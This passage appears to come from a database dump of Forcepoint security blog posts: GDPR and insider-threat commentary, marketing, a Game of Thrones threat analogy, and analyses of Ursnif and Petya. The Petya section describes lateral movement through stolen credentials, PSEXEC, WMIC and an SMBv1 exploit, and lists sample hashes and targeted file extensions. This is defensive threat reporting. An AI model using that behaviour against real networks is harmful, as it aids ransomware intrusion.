NGFW security products. ACE (also known as Triton ACE) provides signature-less analytics to identify malicious intent, including evasion techniques to mask the malware. Forcepoint NGFW is capable of detecting and blocking TOR.\n\nProtection is in place at the following stages of attack:\n\nStage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n\nStage 5 (Dropper File) - Variants are prevented from being downloaded.\n\nStage 6 (Call Home) - Attempts to contact its C&C server are blocked.\n\nConclusion\n\nUrsnif spreads itself through emails provided with a plaintext password for an attached encrypted document. In general, this method is used by senders when the attached documents contain sensitive content.

A great deal of activity and indeed anxiety is occurring as enterprises prepare themselves to become ready before May 25, 2018. \n\n\n\n	With critical data everywhere within organisations today, and all too often in parallel with personal data on employee devices, it’s challenging for businesses to see how and where data is used. A data breach, be it a malicious or unintentional act, ultimately inflicts the most damage at the points in which people interact with critical business data and intellectual property. These ‘human points’ of interaction have the potential to undermine even the most comprehensively-designed systems, and could derail an organization’s preparation for GDPR readiness.\n\n\n\n	It is important that activity around the regulation is focused on meeting the fundamental principles and requirements of the GDPR, rather than seeing adherence to the regulation as a check-box exercise.\n\n\n\n	There has been an urgent need to update the existing Data Protection Directive (DPD), which was passed in 1995. The first meeting, assessment and proposal to update the Directive was made in January 2012, and the reasons were clear: it was woefully outdated and no longer fit for purpose due to rapid technological development by both private companies and public authorities to pursue efficient and valuable data processing activities.  Understanding the 2012 assessment, proposal and its findings remain important to the success of the GDPR.\n\n\n\n	Aside from the requirement to update from a technological point of view, because the DPD was open to interpretation by each EU member state, each could apply their own variation of the law.  My experiences as an information security professional operating both inside and outside of the DACH region reflected this: in the late 90s, the Acts that followed the DPD were at first universal, but in the 00s the acts were amended meaning organizations needed to regularly review systems and processes, giving rise to high levels of uncertainty and concern on rights, security, notifications and transfer agreements. \n\n\n\n	The European Commission sought to address the failings of the DPD with their “Better Regulation” policy, and following an impact assessment it became clear that an update would be required.  This update eventually became the GDPR.\n\n\n\n	GDPR at its core has a large problem to solve.  Remember, private and public organizations want to process personal data and many of them want to do this lawfully. International businesses who are processing or indeed storing European data subjects’ data are impacted, so the implications are truly global.\n\n\n\n	The following four areas were concerns identified in the 2012 assessment that are addressed by the GDPR:\n\n\n\n	Right to Erasure and other Data Subject Rights (Articles 15-21)\n\n\n\n	Security of Processing (Article 32)\n\n\n\n	Accountability – Security Breach Notification (Articles 33 & 34)\n\n\n\n	Data Transfers (Articles 44-50)\n\n\n\n	It is critical that both information security and privacy professionals are aware of these changes and new articles, not simply from a regulatory perspective but also from a practical perspective.  Putting aside for the moment the discussions, hype and media concern around potential fines and sanctions, Forcepoint has co-produced a practical whitepaper to focus on the four imminent areas of change.\n\n\n\n	We have engaged with Hunton & Williams and Rosemary Jay, Senior Attorney at Hunton & Williams and former Head of the Legal Office at the Information Commissioner to produce a whitepaper exclusively on these four areas and to include key action items to help organizations become prepared before the enforcement day.\n\n\n\n	\n\n\n\n	Action items include:\n\n\n\n		Undertake review of organization’s risk dynamic for all forms of processing\n	\n	\n		Establish/update detailed information security policies and procedures covering both organizational and technical measures\n	\n	\n		Develop templates for notifications to Supervisory Authorities (SAs) and data subjects\n	\n	\n		Create a system for logging detailed records of data breaches\n	\n	\n		Perform a complete analysis of all data flows from the EEA and establish in which non-EEA countries processing will be undertaken\n	\n	\n		Review cloud service agreements for location of data storage and any data transfer mechanism, as relevant\n	\n\n	Forcepoint can guide organizations towards GDPR preparedness with products that can help companies identify, protect, detect, respond and recover in case of a data breach. We have three core areas of expertise where we can help:\n\n\n\n		Provide organizations with deep visibility into how critical data is processed across their infrastructure, whether on-premises, in the cloud or in use by a remote workforce.\n	\n	\n		Enable organizations to monitor, manage and control data (at rest, in use and in motion).\n	\n	\n		Utilize behavioral analytics and machine learning to discover broken business processes and identify employees that elevate risk to critical data.\n	\n\n	Download the whitepaper here.', 'https://www.forcepoint.com/blog/insights/gdpr-practical-guidance-and-advice-four-key-areas\n');

Dick’s 1956 novel “The Minority Report,” murder ceased to occur due to the work of the “Precrime Division,” that anticipated and prevented killings before they happened. Today, we are only beginning to see the impact of predictive analytics upon cybersecurity – especially for insider threat detection and prevention. Based on user interaction with data, CISOs and their teams emerge as the IT equivalent of a Precrime Division, empowered to intervene before a violation is ever committed. We will examine the technologies which make predictive analytics valuable, along with ethically minded guidance to strike the balance between vigilance and privacy.\n\n\n\n	Don’t Miss these in-booth Presentations\n\n\n\n	No matter what topic interests you, Forcepoint has you covered this year with presentations that range from firewalls to data protection to cloud security to cross domain. Check out the details on our in-booth presentations below:\n\n\n\n	The Networking Industry’s Dirty Secret: Why Are Evasions Still a Thing?\n\n\n\n	Firewalls exist to keep attackers and malware out. But for years, hackers have been bypassing even the latest NGFWs and IPSs using Advanced Evasion Techniques (AETs for short).  We released Evader, an evasion test lab, years ago to help the industry fix the problem. But have they? Evader’s back so that you can test for yourself and see how even the biggest names in network security STILL leave you exposed.\n\n\n\n	Top 3 Myths About Modern Firewalls -- Debunked\n\n\n\n	People are spreading out, working in branches and remote locations, using apps from far-flung data centers, the cloud and everywhere in between. Conventional wisdom says that connecting and protecting people in such environments is hard and scary. But, taking a new, human-centric approach to network security can dispel these myths.\n\n\n\n	User-Focused Data Protection\n\n\n\n	Today’s approach to data security has failed. With a focus on detecting malware threats and meeting compliance demands, enterprises have done little to actually reduce the risk of data loss. They’ve overlooked the most obvious risk – their people who mostly want to get their job done but often inadvertently expose critical data. Forcepoint believes data protection starts and ends with your people. Guide users to make smart decisions with data. Understand how your people interact with your valuable data and analyze that behavior for risk. This user-focused data protection creates a partnership between the enterprise and its people to protect data – while accurately identifying the compromised users and malicious insiders as outliers.\n\n\n\n	Why UBA is essential for the Cloud\n\n\n\n	As Cloud adoption has transformed how and where employees work, the shift in how we access, and the device we use, have also evolved.  UBA is an essential tool to providing rapid analysis and response to ever growing risks.  Come and learn about Advanced UBA and how it is the principal defense if you have embraced the Cloud.\n\n\n\n	Enabling Cyber Warriors Securing Global Missions\n\n\n\n	This session will illustrate the concept of network separation (why this is a security best practice) and how using cross domain solutions (access and transfer) reduce the security burden on the user – allow them to work rapidly, efficiently and easily – and increase the security posture of the enterprise.\n\n\n\n	Highlighted will be how cross domain solutions enable the human point of real-world mission operations because users have access to the appropriate data where and when they need it most, eliminating information sharing boundaries between agencies and partner nations.\n\n\n\n	We’re Growing and Hiring!\n\n\n\n	Forcepoint’s Global Talent Acquisition team will be out in force at the conference with regular presentations in the booth as well as a presence in the Career Zone on the 2nd floor.

The adoption of the GDPR within the EU has led to questions regarding the application of the new regulation to insider threat screening programs in Europe. (The United Kingdom provides a special case as the adoption of GDPR may, or may not, be effected by ongoing negotiations regarding Britain’s decision to leave the Union.)\n\n\n\n	The GDPR arises from the context of the existing Data Protection Directive. Our conclusion is that the GDPR does not significantly change existing legal requirements and that most insider threat programs can be implemented in a manner consistent with legal requirements.\n\n\n\n	This conclusion comes with caveats: First, an insider threat program is more likely to be acceptable to the extent it is grounded in legal necessity (e.g. a compliance mandate). Second, the program must be transparent to employees. And, third, significant reservations may arise if the program incorporates non-enterprise data (e.g. outside social media) into the threat model.\n\n\n\n	The Privacy Framework\n\n\n\n	Today, employee monitoring is, generally, subject to the Data Protection Directive which regulates the collection and use of personal data across all sectors of the economy. In the context of employee monitoring, the Article 29 Working Party (“WP29” — a group of representatives from the Data Protection Authorities of the Member States) issued a working paper (WP55) which, generally disfavors employee monitoring. The paper acknowledges, however, that monitoring is permissible when there are “specific and important” business reasons.\n\n\n\n	Article 88 of the GDPR directly addresses the question of “Processing in the Context of Employment.” It provides that Member States may, by law or collective agreement, provide for more specific rules to ensure relating to the processing of employee data. Article 88 specifically calls out the protection of an employer’s or customer’s property as grounds for processing employment-related data. And, as the WP29 noted with respect to the Data Protection Directive, some of these grounds might arise because of the need to perform a contract; from a legal obligation (like, a compliance requirement) or from some other legitimate employer interest.\n\n\n\n	This overall reading was confirmed earlier this month by another opinion from the WP29, on processing employee data. To be sure, the WP29 opinion sounded a note of caution about large-scale, disproportionate data processing. And it expressed significant concern about employee privacy (as, for example, in its skepticism about the deployment of a TLS decryption appliance (p.13)). However, the working party also acknowledged, again, that legitimate interests of the employer may justify some practices. Thus, for example, the opinion makes clear that employers may monitor the LinkedIn profiles of former employees for the duration of non-compete clauses (p.12).* Likewise, the working party acknowledges that an employer may deploy a Data Loss Prevention tool, providing its use is fully justified and measures are taken to mitigate risks to the employee’s personal privacy (p.15).\n\n\n\n	Conclusion\n\n\n\n	As noted, the GDPR has yet to take effect. And its implementation will vary from Member State to Member State based upon unique legal principles of each nation. The WP29 opinion issued this month will provide useful guidance to Member State legislatures but does not bind them.\n\n\n\n	In our view, a carefully crafted insider threat program will likely satisfy the privacy concerns of the EU.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (70, 'Cyberattacks Are Here: Security Lessons from Jon Snow, White Walkers & Others from Game of Thrones', 'Virginia SatromSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'An analysis of Game of Thrones characters as cyber threats to your enterprise.\n\n\n\n	As most of you have probably seen, we recently announced our new human point brand campaign. Put simply, we are leading the way in making security not just a technology issue, but a human-centric one. In light of this, I thought it would be fun to personify threats to the enterprise with one of my favorite shows - Game of Thrones. Surprisingly, there are a lot of lessons that can be learned from GoT in the context of security.\n\n\n\n	Before we start, I’d like to provide a few disclaimers:\n\n\n\n		This is meant to be tongue in cheek, not literal, so take off your troll hat for the sake of some interesting analogies.\n	\n	\n		This is not comprehensive. Honestly, I could have written another 5,000 words around ALL the characters that could be related to threats.\n	\n	\n		This is based off of the Game of Thrones television series, not the books.\n	\n	\n		And finally, spoilers people. There are spoilers if you are not fully caught up through Season 6. You’ve been warned :)\n	\n\n	Now, let\'s dive in, lords and ladies…\n\n\n\n	What makes this Game of Thrones analysis so interesting is that these characters, depending on external forces, can change drastically from season to season. Therefore, our favorite character could represent a myriad of threats during a given season or the series overall. This concept relates to what we call ‘The Cyber Continuum of Intent’ which places insiders in your organization on a continuum which can move fluidly from accidental to malicious given their intent and motivations. There are also many instances where a character is a personification of a cyber threat or attack method.\n\n\n\n	Let’s start with one of the most devious characters – Petyr Baelish aka Littlefinger. Littlefinger is a good example of an advanced evasion technique (AET) that maneuvers throughout your network delivering an exploit or malicious content into a vulnerable target so that the traffic looks normal and security devices will pass it through. As Master of Coin and a wealthy business owner, he operates in the innermost circle of King’s Landing, while secretly undermining those close to him to raise his standing within Westeros. He succeeds, in fact, by marrying Lady Tulley to ultimately become the Protector of the Vale with great influence over its heir – Robyn Arryn of the Vale. Looking at his character from another angle, Littlefinger could also be considered a privileged user within a global government organization or enterprise. He is trusted by Ned Stark with Ned’s plans to expose the Lannister’s lineage and other misdoings, but he ultimately uses that information and knowledge for personal gain – causing Ned’s demise. And let’s not forget that Littlefinger also betrays Sansa Stark’s confidence and trust, marrying her to Ramsay Snow.\n\n\n\n	Varys and his ‘little birds’ equate to bots, and collectively, a botnet. Botnets are connected devices in a given network that can be controlled via an owner with command and control software. Of course, Varys (aptly also known as the Spider) commands and controls his little birds through his power, influence and also money. When it comes to security, botnets are used to penetrate a given organization’s systems – often through DDoS attacks, sending spam, and so forth. This example is similar to Turkish hackers who actually gamified DDoS attacks, offering money and rewards to carry out cybercrime.\n\n\n\n	Theon Greyjoy begins the series as a loyal ward to Eddard Stark and friend to Robb and Jon, but through his own greed and hunger for power becomes a true malicious insider. He also is motivated by loyalty to his family and home that he has so long been away from. He overtook The North with his fellow Ironborns, fundamentally betraying the Starks.\n\n\n\n	Theon Greyjoy and Ramsay Bolton (formerly Snow) are no strangers to one another, and play out a horrific captor/captive scenario through Seasons 4 and 5. Ramsay is similar to Ransomware as it usually coerces its victims to pay a ransom through fear. In the enterprise, this means a ransom is demanded in Bitcoin for the return of business critical data or IP. Additionally, Ramsay Snow holds RIckon Stark as a hostage in Season 6. He agrees to return Rickon to Jon Snow and Sansa Stark, but has his men kill Rickon right as the siblings reunite. This is often the case in Ransomware that infiltrates the enterprise – often, even if Ransom is paid, data is not returned.\n\n\n\n	Gregor Clegane, also known as The Mountain, uses sheer brute force to cause mayhem within Westeros, which would be similar to brute force cracking. This is a trial and error method used to decode encrypted data, through exhaustive effort. The Mountain is used for his strength and training as a combat warrior, defeating a knight in a duel in Season 1, and in Season 4 defeating Prince Oberyn Martell in trial by combat - in a most brutal way. He could also be compared to a nation state hacker, with fierce loyalty to the crown -- particularly the Lannister family. He is also a reminder that physical security can be as important as virtual for enterprises.\n\n\n\n	Depending on the season or the episode, this can fluctuate, but 99% of the time I think we can agree that Cersei Lannister is a good example of a malicious insider and more specifically a rogue insider. She is keen to keep her family in power and will do whatever it takes to maintain control over their destiny. My favorite part about Cersei is though she is extremely easy to loathe, throughout the entire series it is clear she loves her children and would do anything for them. After the last of her children dies, she quickly evolves from grief to rage. As the adage says, sad people harm themselves but mad people harm others. Cersei can be related to a disgruntled employee who intends to steal critical data with malicious intent that is facing challenges from within or outside of the workplace.\n\n\n\n	If we take a look at Seasons 4 and 5, and the fall of Jon Snow, many of the Night’s Watch members are good examples of insiders. Olly, for example, starts out as a loyal brother among the Night’s Watch. If he happened to leak any intel that could harm Jon Snow’s leadership or well-being, it would have been accidental. This could be compared to an employee within an organization who is doing their best, but accidentally clicks on a malicious link. However, as Snow builds his relationships with the wildlings, Olly cannot help but foster disdain and distrust toward Snow for allying with the people that harmed his family. Conversely, Alliser Thorne was always on the malicious side of the continuum, having it out for Snow especially after losing the election to be the 998th Lord Commander of the Night’s Watch. Ultimately, Thorne’s rallying of the Night’s Watch to his side led to Snow’s demise (even if it was only temporary).\n\n\n\n	Sons of the Harpy mirror a hacktivist group fighting the rule of Daenerys Targaryen over Meereen. They wreak havoc on Daenerys’s Unsullied elite soldiers and are backed by the leaders who Daenerys overthrew - the ‘Masters’ of Meereen - in the name of restoring the ‘tradition’ of slavery in their city. They seek to overthrow Daenerys and use any means necessary to ensure there is turmoil and anarchy. Hacktivists are often politically motivated. If the hacktivist group is successful, it can take the form of a compromised user on the Continuum – through impersonation. After all, the most pervasive malware acts much like a human being.\n\n\n\n	Let’s not forget about the adversaries that live beyond The Wall – The White Walkers. The White Walkers represent a group of malicious actors seeking to cause harm in the Seven Kingdoms, or for this analogy, your network. What is interesting about these White Walkers is that they are a threat that has been viewed as a legend or folklore except for those that have actually seen them. However, we know that this season they become very real. Secondly, what makes the White Walkers so remarkable is that we do not know their intentions or motivations, they cannot be understood like most of these characters seeking power or revenge. I argue that this makes them the most dangerous and hardest threat to predict. And lastly, if we think about how the White Walkers came to be, we know that they were initially created to help defend the Children of the Forest against the First Men. But, we now know that they have grown exponentially in number and begun to take on a life (pun intended) of their own. This is equated to the use of AI in the technology space which some fear will overtake us humans.\n\n\n\n	In my mind The Wall itself could be considered a character, and therefore a firewall of sorts. Its purpose is to keep infiltration out; however, as we learned at the end of Season 6, this wall is penetrable. This leads me to the main takeaway – enterprises and agencies face a myriad of threats and should not rely on traditional perimeter defenses, but have multi-layered security solutions in place.\n\n\n\n	With all of these parallels, it becomes clear that people are the true constant complexity in security. It is known that enterprises must have people-centric, intelligent solutions to combat the greatest threats like those faced in Westeros.', 'https://www.forcepoint.com/blog/insights/cyberattacks-are-here-security-lessons-jon-snow-white-walkers-others-game-thrones\n');

In addition, we believe we were placed in the top-most position for Ability to Execute within the quadrant. This is a part of a growing series of accolades that Forcepoint NGFW has received in the last six months as customers, analysts and others recognize that our products, and our fundamental approach to network security, are different. Our software-based firewalls have centralized manageability, high availability and unrivaled security at their core so that they can deliver uniform capabilities and high performance seamlessly throughout physical, virtual, and cloud networks.\n\n\n\nWe’re truly honored to be called a Visionary. We formed Forcepoint to transform cybersecurity. While other vendors seem to think that NGFWs and most other security products are just about blocking the latest malware or threat du jour, we see a bigger picture. At Forcepoint, we want to understand cyber behaviors and user intent as people interact with critical data so that we can empower employees with unobstructed access to information while protecting intellectual property and simplifying compliance. Our next generation firewalls are a key part of that, providing seamless visibility and enforcement of business policies throughout increasingly complex networks to protect where people and data come together – what we call the Human Point.\n\nWhat Makes Forcepoint Different – Efficiency, Availability, Security \n\nForcepoint NGFW is different from other firewalls. It’s designed specifically for efficiency, availability and security – three aspects that most other vendors just bolt onto the side. Customers tell us again and again that these are among the top reasons they choose to look at Forcepoint NGFW:\n\nEfficiency. All Forcepoint NGFWs – whether in physical office buildings, virtualized data centers, remote branches, or the cloud, are managed together from our NGFW Security Management Center (SMC). According to customers, SMC can cut the burden of managing their network by as much as half. It also incorporates automation for common tasks and provides interactive visibility into what’s happening, even at the furthest reaches of their network, to significantly reduce incident response times.\n	Availability. Forcepoint NGFW also stands apart from the crowd for its ability to keep the network running even when something goes wrong. This high availability goes beyond the simple failover support that most other vendors provide, enabling clusters of different models of firewalls to be mixed and matched for the utmost reliability.\n	Security. As one of the pioneers in detecting and defeating advanced evasion techniques, we take security seriously. Forcepoint NGFW received the highest security score on NSS Labs’ 2017 test of next generation firewalls, and we build one of the best intrusion prevention systems (IPS) into every firewall. But, security is about breadth as well as depth, so we also include anti-bot protection, inspection of encrypted traffic, malware detection, data exfiltration controls, and even advanced proxy technology for protecting mission-critical applications.\nShortlists for Enterprise Firewalls are Changing\n\nThere’s an important change underway in the network security industry. We’re seeing the sets of products that customers evaluate – what purchasing departments call their “shortlists” – increasingly comprise those firewalls that put more focus on delivering actual security and operational efficiency at scale rather than just simple speeds and feeds. Network Security is now about connecting and protecting across diverse environments, without requiring armies of specialized IT experts.\n\nWe feel Gartner’s positioning of Forcepoint as a Visionary with the highest Ability to Execute in the quadrant is exciting because it highlights that doing something different is important. We agree, and we’ll keep striving to offer customers new and better ways to protect where their people and data come together amid a rapidly changing world.', 'https://www.forcepoint.com/blog/insights/forcepoint-jumps-visionaries-quadrant-2017-gartner-magic-quadrant-enterprise-network\n');

I’m especially proud of this campaign because it allows us to share our position as a differentiated cybersecurity company with our customers, partners, influencers, employees and other audiences.\n\n\n\n	I’ve been with Forcepoint for almost three years (formerly as a part of Websense) and have now had two career- (and life-) impacting opportunities here. First, to help launch the company as a new brand in January 2016 and, now, to bring this campaign to life across all platforms and media.\n\n\n\n	As the company has grown and matured, so has our vision and our position relative to the cybersecurity industry. Even though Forcepoint has more than 20 years of cybersecurity experience, many people still think of us as one of the legacy companies that formed us. Or they don’t realize that we’re a new company building intelligent, integrated systems for cloud security, network security, data and insider threat protection and global governments. No matter how solid our strategy is, if no one knows about our new focus areas, we’re facing an uphill battle.\n\n\n\n	With the support of our leadership team, we set about to turn our new vision and approach to security into a fully-formed identity, brought to life via creative. We began working on creative concepts with our brand strategy agency, Mechanica, in December immediately after solidifying the company’s vision, mission and governing brand idea, “Protecting the Human Point.”\n\n\n\n	Nailing down the right look and feel for the creative was tough – many of the early concepts we considered were ultimately scrapped because they were expected and, if there’s one thing we knew we wanted, it was to rise above the sea of sameness in cybersecurity. Too often, the industry looks to technology as the answer. We are taking a new approach by focusing on people, and our creative must support that differentiated view. You’ll notice that tech is absent from our photos and videos; that’s intentional because we’re focusing on the real constant – the people that are both the most vulnerable and valuable parts of security.\n\n\n\n	The conventional approach to security is the “walls and moats” view of preventing attackers from coming inside the network. That’s only half the story. The other half, the more important one, is by addressing security from the perspective of the cyber continuum of intent -- on the potential for normal users to become accidental, compromised or malicious insiders based on a spectrum of risk behavior. Only by understanding intent and the human points of interaction with critical data can enterprises and governments truly stop bad actors and prevent the loss of intellectual property.\n\n\n\n	The Cyber Continuum of Intent\n\n\n\n	\n\n\n	As we began working on the high-level concept, we also thought about our key customer touch points – not only where this creative should exist, but what experience we wanted people to have with it. And we quickly realized that we needed to upgrade our most important customer experience channel – our website. Working with Mechanica and our development partners, Four Kitchens, we went through a full site redesign that began with journey mapping and usability and ended (as much as a website can ever “end”) with today’s launch. It’s a new forcepoint.com, from top to tail and everything in between.\n\n\n\n	I’d be remiss in calling out our agency partners without also giving a huge shout out to the members of Team Forcepoint that made this happen. I am incredibly lucky to work with a world-class Web Team, amazing Designers, Writers, Communicators and Strategists. This launch could not have happened without their dedication to this company.\n\n\n\n	Today’s launch is just the beginning. We’ll roll out a full paid media campaign in the next couple of months to really showcase this stunning creative as it’s meant to be seen. I’ll also share updates and new examples soon. Until then, please enjoy our videos, visit our website and check out our social media channels, which will feature all of the latest on Protecting the Human Point.\n\n\n\n	And if you have suggestions for my team or me, I welcome them.

We believe the industry has placed too much emphasis on attempting to lock down technology infrastructure, which is in a constant state of change. We’ve found ourselves in a cycle of developing products that simply can’t keep pace with the emergence of new threats.\n\n\n\n	Forcepoint is distinct because we believe the core of security is people – understanding how and why they interact with critical data and intellectual property. By examining human behavior we can better understand how and why people create risk – accidentally or maliciously. \n\n\n\n	The opportunity to present this fresh perspective through our brand identity is exactly what drew me to Forcepoint.\n\n\n\n	Our new brand campaign, centered on “protecting the human point,” is not just about beautiful imagery; it is a reflection of what we stand for and where we need to focus our attention. As a newly-formed company, we need to show the world who we are and how we’re different. We believe this creative campaign conveys Forcepoint’s human-centric view of cyber, and our vision: to stop the bad and free the good.\n\n\n\n	We’re excited to unveil the full campaign today!

It applies thousands of real time threat analytics, behavioral sandboxing and other advanced defense technologies to identify targeted attacks.\n\n\n\n	About FedRAMP\n\n\n\n	The Federal Risk and Authorization Management Program, or FedRAMP, is a U.S. government-wide program that provides a standardized approach to security assessment, authorization and continuous monitoring for cloud products and services. FedRAMP is the result of close collaboration with cybersecurity and cloud experts from the General Services Administration (GSA), National Institute of Standards and Technology (NIST), Department of Homeland Security (DHS), Department of Defense (DOD), National Security Agency (NSA), Office of Management and Budget (OMB), the Federal Chief Information Officer (CIO) Council and its working groups, as well as private industry.\n\n\n\n	Products go through three phases during the FedRAMP authorization process.\n\n\n\n	Phase 1: The process starts with a Readiness Assessment of a company’s operational system. This is done through completing a Readiness Assessment Report. After completing the Readiness Assessment the system will be designated “FedRAMP Ready.” Forcepoint’s Cloud Security products have been FedRAMP Ready since 2016.\n\n\n\n	Phase 2: The next step in the FedRAMP process is the development of a complete security package for review.  Cloud systems are designated as “FedRAMP In Process” upon completion and delivery of the security package to the JAB.\n\n\n\n	Phase 3: The final step is the JAB Authorization Review Process. In this phase the FedRAMP PMO will conduct a thorough review of the complete security package. The JAB will then make a recommendation to grant a company FedRAMP authorization. At this point the system will be designated at “FedRAMP Authorized,” which takes about another 4 to 6 months.\n\n\n\n	For more information regarding the FedRAMP process please visit the FedRAMP website: www.fedramp.gov\n\n\n\n	Forcepoint is now listed in the FedRAMP Marketplace in the “FedRAMP In Process” section of the FedRAMP.gov website at https://marketplace.fedramp.gov/#/product/forcepoint-cloud-security?status=In%20Process&sort=productName\n\n\n\n	More Links\n\n\n\n		Forcepoint Cloud Security product information https://www.forcepoint.com/cloud\n	\n	\n		Overview of the FedRAMP Program -- https://www.fedramp.gov/about-us/about/\n	\n	\n		Overview of the FedRAMP Accelerated Process -- https://www.fedramp.gov/participate/fedramp-accelerated-process/', 'https://www.forcepoint.com/blog/insights/forcepoint-cloud-security-reaches-%E2%80%9Cfedramp-process%E2%80%9D-phase\n');

Not the behemoth of a conference such as RSA and Black Hat, the Gartner event is smaller, more intimate, and provides attendees with a pretty thoughtful set of talks from both Gartner analysts and practitioners. It’s a nice gathering, and, as is typical, set me thinking a bit.\n\n\n\n	Over the last few years Gartner has – correctly, in my opinion – started to lean into concepts like risk management and adaptability in the face of threats. That chord was struck firmly during the opening of the conference, where the idea of Continuous Adaptive Risk and Trust Assessment was described. That’s a mouthful, so we’re left with a new acronym: CARTA. While it’s not a particularly catchy term, the ideas within it resonate well with how we believe practitioners need to think about security.\n\n\n\n	As I see it, one of the primary drivers for CARTA is that it has become increasingly difficult to decide with certainty if an event is good or bad. For example, consider a file that is being downloaded by a user. We scan that file at the gateway, and then have to make a decision: assuming the file isn’t disallowed by policy, is it good (in which case let it in!) or bad. The problem is, many times we just don’t know with absolutely certainty.\n\n\n\n	It’s hard to immediately grasp why we don’t – or more correctly, can’t – always know. At the scientific level, it’s a well-known result that you can’t make a perfect malware scanner. Pragmatically, though, the answer is simpler: while we can mark certain things as known-bad, it’s hard to handle everything else. Even a file we know is good may contain a previously-unknown vulnerability that can be exploited.\n\n\n\n	There’s at least two ways to deal with that uncertainty. First, you can try to make a better mousetrap – to keep whittling away at the edge cases that we’re not sure about. This is time well spent, but it’s also an impossible fight to win in the long term. Second – and in my take, this is the CARTA idea – you pragmatically do the best you can, but continually asses the risk the system faces and the trust you have in the different entities it is made up of; you then adapt to these new conditions, doing the right thing at the right time. Security becomes fluid rather than static (i.e., continuous adaptive), and the attacker has to figure out how to find their way through a moving maze.\n\n\n\n	All that is just one example – the ideas within CARTA can be applied across the security space, including less technical areas such as governance.\n\n\n\n	Looking around the room while the Gartner analysts introduced CARTA, it was interesting to gauge the reaction. For many, the ideas clearly resonated; people were engaged, listening carefully in a packed house. That, to me, is very positive sign, because in security, perfect truly is the enemy of good, and this more pragmatic adaptive approach is the way forward. While we wish we could mitigate all risk, to do business successfully is to embrace and control risk. Attackers morph continuously to maximize their efficacy; to combat that shape-shifting adversary, we must also adapt, continually protecting our most exposed assets with much more granularity than the blunt instruments of “Deny” and “Allow.” Instead, I believe that CARTA imagines a set of mitigations that sit in between, helping mitigating the risk, but allowing the access. That’s certainly in line with how Forcepoint thinks about security, and many features in our products already reflect that.\n\n\n\n	Of course, this being security, the glass is never going to be all full. Adaptation – autonomous or not – opens up a new type of attack surface, and we need to think hard about the implications of that. However, while this is a hard problem, it’s not the only one. As of right now defenders (and I mean ALL of us here, not just Forcepoint or other vendors), still don’t follow best practices reliably even though they know what they are. If that’s a challenge, backing in to this more complex CARTA mindset is going to be difficult for the average company, though the model does anticipate this by focusing on risk and the idea of handling the worst problem first. To get there, we’re going to have to change our mental models. That’s hard, but by no means impossible. Most importantly, I believe that the payoff is worth it.\n\n\n\n	And on that positive note, I’ll lean back again, and sit, and think again. Despite the rough seas we’ve been in for a while, I’m optimistic.', 'https://www.forcepoint.com/blog/insights/smarter-carta-0\n');

There is no longer a mechanism to give the victim the decryption key for paying the ransom as the email address to communicate with the attacker has been deactivated. The payment mechanism is very weak and is linked to just a single email address, which is no longer accessible. Even if a victim were to pay the ransom into the appropriate BitCoin wallet the attacker now has no means to share the decryption key.\n\nObtaining unencrypted files is now much more problematic, although decryption tools may soon become available from third parties.\n\nOccasionally a business may decide to pay the ransom demand, but in the case of Petya it is no longer worthwhile.\n\nInfection vector & protection statement\n\nMicrosoft has reported that the initial infection vector is currently believed to have been via malicious code masquerading as a legitimate software update. Owing to the inherent trust relationship associated with automatic software updates, this vector is less likely to be detected by perimeter protection. \n\nThis is a major departure from how most ransomware propagates: this current iteration of Petya avoids the use of communication vectors secured by web security gateways or email security gateways.\n\nThe samples analysed attempt to move laterally within networks by using credentials stolen from victim machines along with a combination of PSEXEC and WMIC commands and by the use of SMBv1 exploits. To date, these samples have not been observed attempting to self-propagate to other organisations, instead confining this behaviour to local networks.\n\nHowever, movement between trusted networks using stolen administrative credentials valid on both the source and destination networks appears viable. It is not clear at present whether organisations that have a degree of trust between their networks and those of an external organisation (e.g. a managed service provider) are at increased exposure or not.\n\nOverall, the nature of Petya does not come as a great surprise to Forcepoint Security Labs researchers: in October of 2016 Forcepoint Security Labs warned of the perils of rogue software updates being delivered by automated software update mechanisms in our Freeman Report. Showing significant parallels with the initial infection vector used to deliver the Petya ransomware, our Freeman report documented the dangers of a rogue software update to a legitimate code analysis tool. \n\nWe recommend vetting third-parties who deliver software updates into your environment and seek to understand what abandoned software (‘abandonware’) may still be running and accepting updates. \n\nAs confirmed on 27 June 2017 in the immediate wake of the outbreak, Forcepoint NGFW is capable of both detecting and blocking use of the SMB exploit leveraged by this attack for customers using Forcepoint NGFW within their networks.\n\nIf a secondary campaign is launched via a compromised website or malicious email, Forcepoint Web Security and Email security is in position to detect and protect against this new threat. \n\n \n\nPosted by Forcepoint Security Labs  on June 27, 2017\n\nDéjà vu: Petya ransomware appears with SMB propagation capabilities\n\nThe Petya outbreak recorded on 27 June 2017 has had a significant impact on a number of global organisations, with media outlets reporting impacts as significant as the cessation of activity at the Port of Rotterdam in the Netherlands [1].\n\nWhile many may be loath to think back six weeks to the trauma of May’s WannaCry outbreak (/security-labs/wannacry-post-outbreak-analysis), there are a number of parallels between the two incidents ranging from the global reach of the outbreak to the techniques by which the malware is spread.\n\nAnalysis\n\nAt the time of writing, Forcepoint Security Labs has analysed one sample associated with the outbreak (SHA256: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745). Details of this are shown in the table below.\n\nWe are in the process of confirming an analysing additional samples and variants as they become available.\n\nSHA1\n			34f917aaba5684fbe56d3c57d48ef2a1aa7cf06d\n		SHA256\n			027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745\n		Timestamp\n			2017-06-18 07:14:36\n		Size\n			353.9 KB\n		The sample itself is a DLL file, launched with the hard-coded parameter ‘#1’.\n\nUpon execution, it attempts to spread via an SMBv1 exploit before ultimately rebooting the machine, presenting a faked ‘CHKDSK’ screen, and showing the ransom message. The reboot and subsequent messages are typical of previously observed Petya behaviour.\n\nComment: As in the early stages of the WannaCry infection, the initial infection vector for a given organisation is unclear.\n\nComment: There appears to be a significant delay between running the malware and the beginning of the encryption process. Given that the malware reboots the machine, this is almost certainly to allow a reasonable amount of time to propagate across networks.\n\n\n\nA large number of strings are hard-coded within the file, including the Bitcoin wallet used for payments, the ‘support’ email address used by the perpetrators, and the targeted file extensions. The targeted file extensions are shown below.\n\n\n.3ds .7z .accdb .ai .asp .aspx .avhd .back .bak .c .cfg .conf .cpp .cs .ctl .dbf .disk .djvu .doc .docx .dwg .eml .fdb .gz .h .hdd .kdbx .mail .mdb .msg .nrg .ora .ost .ova .ovf .pdf .php 